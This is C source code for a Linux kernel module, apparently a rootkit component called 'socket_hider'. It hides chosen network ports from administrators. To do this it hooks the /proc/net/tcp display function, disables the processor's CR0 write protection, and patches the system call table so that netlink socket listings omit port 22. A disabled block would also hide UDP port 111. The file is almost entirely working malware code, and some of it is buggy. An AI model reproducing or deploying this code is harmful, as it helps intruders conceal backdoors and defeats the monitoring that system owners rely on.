#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/sched.h>
#include <asm/page.h>
#include <linux/unistd.h>
#include <linux/sysfs.h>
#include <linux/delay.h>

#include <net/tcp.h>
#include <net/udp.h>
#include <linux/inet_diag.h>
#include <linux/socket.h>
//#include "fs/proc/internal.h" 

#include "sysmap.h"

static int call_counter = 0;

void **sys_call_table;
/* since this sturct is no longer available in proc_fs, taken from fs/proc/internal.h */
struct proc_dir_entry {
          unsigned int low_ino;
          umode_t mode;
          nlink_t nlink;
          kuid_t uid;
          kgid_t gid;
          loff_t size;
          const struct inode_operations *proc_iops;
          const struct file_operations *proc_fops;
          struct proc_dir_entry *next, *parent, *subdir;
          void *data;
          atomic_t count;         /* use count */
          atomic_t in_use;        /* number of callers into module in progress; */
                          /* negative -> it's going away RSN */
          struct completion *pde_unload_completion;
          struct list_head pde_openers;   /* who did ->open, but not ->release */
          spinlock_t pde_unload_lock; /* proc_fops checks and pde_users bumps */
          u8 namelen;
          char name[];
  };


asmlinkage int (*original_tcp_show) (struct seq_file *m, void *v);
asmlinkage int (*original_udp_show) (struct seq_file *m, void *v);
asmlinkage long (*original_socketcall) (int call, unsigned long *args);

/* Access the port number and if it should be hidden then return 0 else return the original function */
static int manipulated_tcp_show(struct seq_file* m, void *v)
{
	int port;
	struct sock *sk;
	struct inet_sock *inet;

	if(SEQ_START_TOKEN == v)
		return original_tcp_show(m,v);
	sk = (struct sock *) v;
	inet = inet_sk(sk);
	port = ntohs(inet->inet_sport);
	
	/* Hard coded to the port we know: todo: Change it according to user input*/
	if(port == 22)
		return 0;

	return original_tcp_show(m,v);
}

/* Access the port number for udp and if it should be hidden then return 0 else return the original function */
static int manipulated_udp_show(struct seq_file* m, void *v)
{
        int port;
        struct sock *sk;
        struct inet_sock *inet;

        if(SEQ_START_TOKEN == v)
                return original_tcp_show(m,v);
        sk = (struct sock *) v;
        inet = inet_sk(sk);
        port = ntohs(inet->inet_sport);
        
        /* Hard coded to the port we know: todo: Change it according to user input @gmc*/
        if(port == 111)
                return 0;

        return original_udp_show(m,v);
}

/* Check if we need to hide this socket */
static int checkport(struct nlmsghdr *nlh)
{
	struct inet_diag_msg *r = NLMSG_DATA(nlh);
    	int lport = ntohs(r->id.idiag_sport);
	
	if(lport == 22) //@gmc: change
		return 1;
	return 0;
}

/* hooked socketcall */
asmlinkage long manipulated_socketcall(int call, unsigned long __user *args)
{	
	long retval;
    	long status; // bytes remaining until end of result
    struct msghdr* msg;
    struct nlmsghdr* h;
    __kernel_size_t numblocks;
    struct inet_diag_msg *r;
    char* currhdr;
    int i;
    int found=0;
    int offset;

		
	if(call == SYS_RECVMSG)
	{
	msg = (struct msghdr*)(((int*)args)[1]);
        h = (struct nlmsghdr*)(msg->msg_iov->iov_base);
        numblocks = msg->msg_iovlen;
        r = NLMSG_DATA(h);
        // compute "real" result with orig_socketcall
        retval = original_socketcall(call, args);
        // status holds the bytes remaining
        status = retval;
        // now, we remove the sockets to be hidden from the result...
        found = 1;
	
	while (NLMSG_OK(h, status)) {
            if (found == 0){
                h = NLMSG_NEXT(h, status);
            }
            currhdr = (char*)h;
            if (checkport(h))
	    {
                found = 1;
                offset = NLMSG_ALIGN((h)->nlmsg_len);
                for (i=0; i<status; ++i){
                    // "NLMSG_ALIGN((nlh)->nlmsg_len)" computes the length of the nlmsghdr nlh in bytes.
                    currhdr[i] = currhdr[i + offset];
                }
                retval = retval - offset;
            }
            else {
                found = 0;
            }
        }
	return retval;
	}	

	
return original_socketcall(call, args);
}
/*
 * Disable the writing protection for the whole processor.
 */
static void disable_page_protection (void)
{
        unsigned long value;
        asm volatile("mov %%cr0,%0" : "=r" (value));
        if (value & 0x00010000)
        {
                value &= ~0x00010000;
                asm volatile("mov %0,%%cr0": : "r" (value));
        }
}

/*
 * Reenable the writing protection for the whole processor.
 */
static void enable_page_protection (void)
{
        unsigned long value;
        asm volatile("mov %%cr0,%0" : "=r" (value));
        if (!(value & 0x00010000))
        {
                value |= 0x00010000;
                asm volatile("mov %0,%%cr0": : "r" (value));
        }
}


static int __init hidemodule_init(void)
{
	printk(KERN_INFO "Loading socket_hider LKM...\n");

        /* get the location of the sys_call_table from our sysmap.h file */
        sys_call_table = (void*) sysmap_sys_call_table;

	struct proc_dir_entry *proc = init_net.proc_net->subdir;
    	struct tcp_seq_afinfo *tcp_seq = 0;
    	struct udp_seq_afinfo *udp_seq = 0;
	int count = 0;
	
	while(proc && count<1)
	{	
		if(strcmp(proc->name, "tcp") == 0)
		{	
			tcp_seq = proc->data;
			original_tcp_show = tcp_seq->seq_ops.show;
			tcp_seq->seq_ops.show = manipulated_tcp_show;
			count++;
		}
	//todo : hiding for udp: insmod crashing
	/*	if(strcmp(proc->name, "udp") == 0)
		{
			udp_seq = proc->data;
			original_udp_show = udp_seq->seq_ops.show;
			tcp_seq->seq_ops.show = manipulated_udp_show;
			count++;
		} */
		//todo: write for udp also: done
		proc = proc->next;
	}

        /* disable the write-protection */
        disable_page_protection();

        /*
         * keep pointer to original function in original_socketcall, and
         * replace the system call in the system call table with
         * manipulated_socketcall
         */
        original_socketcall = (void *)sys_call_table[__NR_socket];
        sys_call_table[__NR_socket] = (unsigned long*)manipulated_socketcall;

        /* reenable the write-protection */
        enable_page_protection();

	return 0;
}

static void __exit hidemodule_exit(void)
{
	printk(KERN_INFO "Unloading sockethider module... bye!\n");
	
	while(call_counter > 0)
	{
		msleep(2);
	}
        struct proc_dir_entry *proc = init_net.proc_net->subdir;
	struct tcp_seq_afinfo *tcp_seq = 0;
    	struct udp_seq_afinfo *udp_seq = 0;
	int count = 0;
	
	while(proc && count<1)
	{
		if (strcmp(proc->name, "tcp") == 0)
		{
            		tcp_seq = proc->data;
	                tcp_seq->seq_ops.show = original_tcp_show;
            		count++;
        	}
		/*if(strcmp(proc->name, "udp") == 0)
		{
			udp_seq = proc->data;
			udp_seq->seq_ops.show = original_udp_show;
			count++;
		}*/
	
		proc = proc->next;
	}

	
	/* disable the write-protection */
        disable_page_protection();

        /* Return the system call back to original */
        sys_call_table[__NR_socket] = (unsigned long *)original_socketcall;

        /* reenable the write-protection */
        enable_page_protection();
}

module_init(hidemodule_init);
module_exit(hidemodule_exit);

